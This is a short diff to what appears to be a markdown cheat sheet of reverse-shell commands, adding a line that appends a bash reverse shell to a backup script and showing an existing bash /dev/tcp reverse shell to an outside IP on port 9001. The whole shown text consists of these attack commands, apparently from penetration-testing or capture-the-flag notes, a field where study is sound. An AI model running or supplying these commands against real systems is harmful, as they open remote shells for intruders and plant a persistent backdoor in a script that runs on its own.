@@ -14,6 +14,10 @@
 
 ### bash
 
+```
+echo 'bash -c "bash -i >& /dev/tcp/192.168.131.14/9001 0>&1"' >> /var/backups/script.sh
+```
+
 ```bash
 bash -c "bash -i >& /dev/tcp/10.10.15.222/9001 0>&1"
 ```
